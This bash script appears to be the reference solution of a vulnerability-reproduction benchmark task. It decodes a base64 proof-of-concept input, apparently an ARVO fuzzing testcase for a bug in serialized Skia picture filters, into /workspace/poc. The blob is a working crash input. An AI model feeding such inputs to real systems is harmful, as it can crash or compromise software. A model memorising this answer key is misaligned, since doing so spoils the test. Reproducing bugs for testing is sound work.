#!/bin/bash
# Reference solution: materialize the known-good PoC (the ARVO testcase the
# fix commit a0e30b1e addresses) at /workspace/poc — the 'oracle passes' side of
# the bidirectional validation. (Does NOT build; grading runs on the oracle's
# untouched images, so this is level-independent.)
set -euo pipefail

mkdir -p /workspace
base64 -d > /workspace/poc <<'B64'
FAAAAFNrUGljdHVyZUltYWdlRmlsdGVyAMwAADQBAAABAAAACAAAAHNraWFwaWN0PQAAAAAAGwB/AAABMgAAEAAAgP8BAAAAZGFlcpwAAACcAAAABAAANCkAACH/7iIgAAAAAAAAeuUAABQAASrIwwDOSmAAAAAAAAAAZAAADgAAG+kbGxEbGxv4GhsbAQAEAAAbVoAbGxsbGxsbGxsXGxsbGxs5GwAVAgAAAAQF9kIAAAA0AQAAxAAAAEgAAABza2lhcGljdD0AAAAAABsAE4BAAACAHIobGxsbGxsbmxsbGxsA//8ArQEAAABe//8AIHRucAIAAAAAAABA/x+APwD/fwAjAAAAABOAQAAAAKEBgAAAAwAAAAAAAADg/vcAAAAAAAAAAACA//8/Btx///8vTi8BDAQLBBAAAAAAAAAgZm9lAAEAAAAAIFBnd0ZpbF9lAA==
B64

echo "wrote $(wc -c < /workspace/poc) bytes to /workspace/poc"
